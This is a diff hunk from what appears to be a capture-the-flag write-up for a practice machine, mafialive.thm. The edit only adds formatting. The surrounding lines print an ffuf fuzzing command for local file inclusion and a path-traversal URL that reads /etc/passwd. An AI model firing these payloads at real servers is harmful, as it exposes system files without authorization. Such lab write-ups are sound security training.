@@ -54,7 +54,7 @@ Only to find out many false positives.
 Let's try filtering through size and words:
 `ffuf -u "http://mafialive.thm/test.php?view=/var/www/html/development_testing/FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -c -t 50 -r -fs 286 -fw 41`
 ![](https://github.com/user-attachments/assets/fe5dd264-9e58-4be5-8d52-8f9daa0ddc83)
-We've succesfully exploited LFI. Let's inject the code in the URL to exfiltrate /etc/passwd
+We've succesfully exploited LFI. Let's inject the code in the URL to exfiltrate `/etc/passwd`
 
 `http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//..//..//..//etc/passwd`
 ![](https://github.com/user-attachments/assets/6cbed028-1065-4057-96f3-e2ff9b687c1d)
